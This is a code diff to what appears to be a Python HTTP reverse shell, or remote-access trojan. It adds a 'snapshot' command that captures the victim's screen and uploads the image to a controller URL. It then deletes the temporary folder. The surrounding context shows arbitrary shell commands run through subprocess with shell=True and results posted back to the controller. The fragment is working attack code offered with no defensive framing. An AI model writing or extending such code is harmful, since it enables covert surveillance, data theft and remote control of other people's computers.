@@ -41,6 +41,19 @@ while True:
 
         else:
             post_response = requests.post(url='http://127.0.0.1', data='[-] Unable to find the file !')
+     
+     elif command == 'snapshot':
+        
+        path = tempfile.mkdtemp()  #Create a temp dir to store our snapshot 
+
+        ImageGrab.grab().save( path + "\img.jpg", "JPEG")  #Save the snapshot in the temp dir
+
+        url = 'http://127.0.0.1/store'                   
+        files = {'file': open(path + "\img.jpg", 'rb')}
+        r = requests.post(url, files=files)                 #Transfer the file over our HTTP
+        
+        files['file'].close()   #Once the file gets transfered, close the file.
+        shutil.rmtree(path)  #Remove the entire temp dir
 
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
